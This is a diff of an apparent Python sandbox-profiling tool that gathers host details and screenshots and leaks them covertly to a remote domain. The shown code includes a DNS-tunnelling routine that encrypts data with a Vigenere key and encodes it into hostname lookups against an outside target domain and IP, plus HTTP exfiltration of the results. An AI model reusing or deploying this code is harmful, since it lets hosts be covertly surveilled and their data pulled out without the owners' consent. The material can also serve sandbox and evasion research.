@@ -20,16 +20,18 @@ from threading import Thread
 import pythoncom
 from PIL import ImageGrab
 import requests
+from common_func import translateMessage, rec_split, randomword, readconfig
 
+config = readconfig()
 #Global config
-key = 'ANOTHERONEGOTCAUGHTTODAYITSALLOVERTHEPAPERSTEENAGERARRESTEDINCOMPUTERCRIMESCANDALHACKERARRESTEDAFTERBANKTAMPERINGDAMNKIDSTHEYREALLALIKEBUTDIDYOUINYOURTHREEPIECEPSYCHOLOGYANDSTECHNOBRAINEVERTAKEALOOKBEHINDTHEEYESOFTHEHACKERDIDYOUEVERWONDERWHATMADEHIMTICKWHATFORCESSHAPEDHIMWHATMAYHAVEMOLDEDHIMIAMAHACKERENTERMYWORLDMINEISAWORLDTHATBEGINSWITHSCHOOLIMSMARTERTHANMOSTOFTHEOTHERKIDSTHISCRAPTHEYTEACHUSBORESMEDAMNUNDERACHIEVERTHEYREALLALIKEIMINJUNIORHIGHORHIGHSCHOOLIVELISTENEDTOTEACHERSEXPLAINFORTHEFIFTEENTHTIMEHOWTOREDUCEAFRACTIONIUNDERSTANDITNOMSSMITHIDIDNTSHOWMYWORKIDIDITINMYHEADDAMNKIDPROBABLYCOPIEDITTHEYREALLALIKEIMADEADISCOVERYTODAYIFOUNDACOMPUTERWAITASECONDTHISISCOOLITDOESWHATIWANTITTOIFITMAKESAMISTAKEITSBECAUSEISCREWEDITUPNOTBECAUSEITDOESNTLIKEMEORFEELSTHREATENEDBYMEORTHINKSIMASMARTASSORDOESNTLIKETEACHINGANDSHOULDNTBEHEREDAMNKIDALLHEDOESISPLAYGAMESTHEYREALLALIKEANDTHENITHAPPENEDADOOROPENEDTOAWORLDRUSHINGTHROUGHTHEPHONELINELIKEHEROINTHROUGHANADDICTSVEINSANELECTRONICPULSEISSENTOUTAREFUGEFROMTHEDAYTODAYINCOMPETENCIESISSOUGHTABOARDISFOUNDTHISISITTHISISWHEREIBELONGIKNOWEVERYONEHEREEVENIFIVENEVERMETTHEMNEVERTALKEDTOTHEMMAYNEVERHEARFROMTHEMAGAINIKNOWYOUALLDAMNKIDTYINGUPTHEPHONELINEAGAINTHEYREALLALIKEYOUBETYOURASSWEREALLALIKEWEVEBEENSPOONFEDBABYFOODATSCHOOLWHENWEHUNGEREDFORSTEAKTHEBITSOFMEATTHATYOUDIDLETSLIPTHROUGHWEREPRECHEWEDANDTASTELESSWEVEBEENDOMINATEDBYSADISTSORIGNOREDBYTHEAPATHETICTHEFEWTHATHADSOMETHINGTOTEACHFOUNDUSWILLINGPUPILSBUTTHOSEFEWARELIKEDROPSOFWATERINTHEDESERTTHISISOURWORLDNOWTHEWORLDOFTHEELECTRONANDTHESWITCHTHEBEAUTYOFTHEBAUDWEMAKEUSEOFASERVICEALREADYEXISTINGWITHOUTPAYINGFORWHATCOULDBEDIRTCHEAPIFITWASNTRUNBYPROFITEERINGGLUTTONSANDYOUCALLUSCRIMINALSWEEXPLOREANDYOUCALLUSCRIMINALSWESEEKAFTERKNOWLEDGEANDYOUCALLUSCRIMINALSWEEXISTWITHOUTSKINCOLORWITHOUTNATIONALITYWITHOUTRELIGIOUSBIASANDYOUCALLUSCRIMINALSYOUBUILDATOMICBOMBSYOUWAGEWARSYOUMURDERCHEATANDLIETOUSANDTRYTOMAKEUSBELIEVEITSFOROUROWNGOODYETWERETHECRIMINALSYESIAMACRIMINALMYCRIMEISTHATOFCURIOSITYMYCRIMEISTHATOFJUDGINGPEOPLEBYWHATTHEYSAYANDTHINKNOTWHATTHEYLOOKLIKEMYCRIMEISTHATOFOUTSMARTINGYOUSOMETHINGTHATYOUWILLNEVERFORGIVEMEFORIAMAHACKERANDTHISISMYMANIFESTOYOUMAYSTOPTHISINDIVIDUALBUTYOUCANTSTOPUSALLAFTERALLWEREALLALIKE'
-target = 'sndbxtst.info'  #target domain for leak <YOUR_DOMAIN>
-url_end = '/sndbxtst/index.php'
-url_screenshot_end = "/sndbxtst/scrn.php"
-subdomain = '.tt.'
+key = config["key"]
+target = config["target"]  #target domain for leak <YOUR_DOMAIN>
+url_end = config["url_end"]
+url_screenshot_end = config["url_screenshot_end"]
+subdomain = config["subdomain"]
+target_ip = config["target_ip"]
 
 #Local config
-target_ip = "159.8.37.74"   #what is the IP for $target <YOUR_IP>
 test_url = 'https://github.com/favicon.ico'
 test_hash = '4eda7c0f3a36181f483dd0a14efe9f58c8b29814'
 
@@ -162,9 +164,7 @@ def is_hooked(func):
     else:
         # print("hooked")
         return True
-# create random word with length
-def randomword(length):
-   return ''.join(random.choice(string.lowercase) for i in range(length))# check whether Internet access is available
+# check whether Internet access is available
 def test_network(url, hash):
     try:
         response = urllib2.urlopen(url, timeout=4)
@@ -241,34 +241,7 @@ def check_dll(dll):
     hMod = windll.kernel32.GetModuleHandleW(dll)
     result = 'DLL ' + hMod + "|"
     return result
-# encrypt our staff with Vigenere, code stolen from here: https://inventwithpython.com/vigenereCipher.py
-# this has the security as an MTP encryption (Many Time Pad) - see here http://travisdazell.blogspot.in/2012/11/many-time-pad-attack-crib-drag.html
-# yes, this crypto is broken
-def translateMessage(message, key, mode):
-    LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    translated = []  # stores the encrypted/decrypted message string
-    keyIndex = 0
-    key = key.upper()
-    for symbol in message:  # loop through each character in message
-        num = LETTERS.find(symbol.upper())
-        if num != -1:  # -1 means symbol.upper() was not found in LETTERS
-            if mode == 'encrypt':
-                num += LETTERS.find(key[keyIndex])  # add if encrypting
-            elif mode == 'decrypt':
-                num -= LETTERS.find(key[keyIndex])  # subtract if decrypting
-            num %= len(LETTERS)  # handle the potential wrap-around
-            # add the encrypted/decrypted symbol to the end of translated.
-            if symbol.isupper():
-                translated.append(LETTERS[num])
-            elif symbol.islower():
-                translated.append(LETTERS[num].lower())
-            keyIndex += 1  # move to the next letter in the key
-            if keyIndex == len(key):
-                keyIndex = 0
-        else:
-            # The symbol was not in LETTERS, so add it to translated as is.
-            translated.append(symbol)
-    return ''.join(translated)
+
 def format_helper(commands):
     result = ""
     for c, v in commands.iteritems():
@@ -423,12 +396,7 @@ def calc_hash():
     z = t1.isAlive()
     result = result + 'SLEEPWORKS ' + str(z) + "|"
     return result
-# for dns tunneling split the domain names
-def rec_split(str, key, host, target):
-    enc1 = translateMessage(str[:61], key, 'encrypt')
-    socket.gethostbyname(enc1 + '.' + host + subdomain + target)
-    if len(str) > 61:
-        rec_split('X-' + str[61:], key, host, target)
+
 # send extracted data via http or dns
 def send_data(result, target, key, host, network_avail, dns_avail):
     #
@@ -447,8 +415,8 @@ def send_data(result, target, key, host, network_avail, dns_avail):
             try:
                 regex = re.compile(r"\W+")
                 name = regex.sub("-", i)
-                if len(name) > 3:
-                    rec_split(name, key, host, target)
+                if len(name) > 1:
+                    rec_split(name, key, host, target,subdomain)
             except:
                 pass
             
